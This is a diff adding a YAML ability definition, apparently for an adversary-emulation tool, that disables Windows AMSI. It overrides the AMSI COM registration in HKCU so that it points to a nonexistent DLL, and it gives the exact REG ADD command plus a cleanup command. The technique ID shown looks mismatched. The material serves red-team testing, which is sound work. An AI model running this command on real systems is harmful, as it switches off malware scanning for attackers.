@@ -1,0 +1,21 @@
+---
+- id: 682fd8ce0e7a672eb8851e9adb15cab0
+  name: AMSI Bypass - Override AMSI via COM
+  description: "With administrative rights, an adversary can disable AMSI via registry\
+    \ value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\
+    \ by overriding the Microsoft Defender COM object for AMSI and points it to a\
+    \ DLL that does not exist.\nThis is currently being used by AsyncRAT and others.\
+    \ \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\n\
+    https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      cmd:
+        command: REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32
+          /ve /t REG_SZ /d C:\IDontExist.dll /f
+        payloads: []
+        cleanup: REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32
+          /f
